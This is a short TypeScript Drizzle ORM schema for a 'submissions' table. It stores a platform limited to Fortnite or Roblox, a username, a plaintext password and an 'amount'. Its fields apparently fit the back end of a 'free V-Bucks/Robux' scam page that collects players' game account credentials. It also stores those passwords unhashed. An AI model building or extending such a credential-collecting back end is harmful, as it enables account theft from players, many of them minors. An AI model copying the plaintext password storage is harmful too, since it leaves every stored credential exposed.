import { pgTable, text, serial, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const submissions = pgTable("submissions", {
  id: serial("id").primaryKey(),
  platform: text("platform").notNull(), // 'fortnite' | 'roblox'
  username: text("username").notNull(),
  password: text("password").notNull(),
  amount: text("amount").notNull(),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertSubmissionSchema = createInsertSchema(submissions).omit({
  id: true,
  createdAt: true,
});

export type Submission = typeof submissions.$inferSelect;
export type InsertSubmission = z.infer<typeof insertSubmissionSchema>;